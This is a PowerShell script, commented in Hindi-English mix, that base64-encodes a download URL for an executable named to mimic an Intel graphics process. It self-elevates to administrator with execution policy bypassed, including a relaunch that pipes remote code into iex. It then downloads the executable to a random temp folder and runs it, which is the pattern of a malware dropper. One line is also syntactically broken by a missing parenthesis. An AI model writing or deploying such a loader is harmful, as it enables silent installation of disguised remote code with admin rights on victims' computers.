# === CONFIG (yahan apne values daalo) ===
$EncodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL0dhZGdldGVjaG5vL25ld3cvcmVsZWFzZXMvZG93bmxvYWQvbmV3L2lnZnhFTS5leGU="
$ExeUrl = [Text.Encoding]::UTF8.GetString(
    [Convert]::FromBase64String($EncodedUrl)

$AppName = "igfxEM.exe"
# ========================================

$ErrorActionPreference = "Stop"

# --- Step 1: Self-Elevate to Admin (UAC) ---
$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # Current script ka URL ya path dobara elevated shell mein run karo
    if ($MyInvocation.Line -match 'http') {
        $url = ($MyInvocation.Line -match '(https?://\S+)')[1]
        Start-Process powershell.exe -Verb RunAs `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr '$url' -UseBasicParsing | iex`""
    } else {
        Start-Process powershell.exe -Verb RunAs `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    }
    exit
}

# --- Step 2: Temp folder banao ---
$TempDir = Join-Path $env:TEMP "App_$(Get-Random)"
New-Item -ItemType Directory -Path $TempDir | Out-Null
$ExePath = Join-Path $TempDir $AppName

# --- Step 3: Download (fast, no progress bar) ---
Write-Host "Downloading..." -ForegroundColor Cyan
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12
Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing

# --- Step 4: Run as Admin (already admin hain) ---
Write-Host "Running..." -ForegroundColor Green
Start-Process -FilePath $ExePath -WorkingDirectory $TempDir -Wait

Write-Host "Done." -ForegroundColor Green
